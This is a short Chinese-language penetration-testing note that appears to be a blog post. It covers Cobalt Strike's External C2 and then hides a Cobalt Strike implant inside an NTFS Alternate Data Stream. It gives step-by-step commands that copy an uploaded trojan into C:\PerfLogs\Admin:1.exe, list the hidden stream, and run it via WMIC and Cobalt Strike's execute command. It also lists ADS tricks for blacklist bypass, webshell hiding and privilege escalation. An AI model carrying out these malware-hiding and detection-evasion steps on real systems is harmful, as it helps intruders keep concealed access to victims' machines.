C2

Cobalt Strike新添加的扩展名为“External C2”,创造隐蔽的C2通道。
即支持：HTTP/HTTPS以及DNS协议

其它远控的协议多为硬编码,在计算机程序或文本编辑中，硬编码是指将可变变量用一个固定值来代替的方法。用这种方法编译后，如果以后需要更改此变量就非常困难了。
所以很容易被ids等检测出来;

cobaltstrike结合ADS

渗透中的ADS

NTFS因为它的稳定性强大的功能，以及它所提供的安全性而成为一种更优越的文件系统 ，NTFS交换数据 流（ADSs）是为了和Macintosh的HFS文件系统兼容，它使用资源resource forks来维持与文件相关的信息
系统一直以来都有允许创建ADSs以及在这种流文件中执行隐藏代码的功能和工具Microsoft KnowledgeBase

  • 经典的IIS 目录访问权限绕过
  • Bypass 黑名单验证
  • webshell隐藏
  • UDF提权中的利用
  • 利用ADS隐藏木马

这里就是通过ADS来隐藏我们的CobaltStrike马;

ADS创建：

echo this is an ADS > myfile:txt:hidden

通过另外个文件来创建
echo this adss > test.txt
type test > myfile.txt:hidden

任何二进制信息的流都可以组成一个文件，而且ADS也就是一个文件而已，可执行东西也能够相当 容易 的隐藏在ads中

type c:\winnt\notepad.exe > myfile.txt:np.exe

shell dir C:\PerfLogs\


shell.exe是我上传的木马或者其它工具, 而Admin这个目录是系统自己创建的;

shell type C:\PerfLogs\shell.exe > C:\PerfLogs\Admin:1.exe
shell dir /r C:\PerfLogs\Admin

WMIC来执行
wmic process call create C:\PerfLogs\Admin:1.exe

CobaltStrike下执行
execute C:\PerfLogs\Admin:1.exe
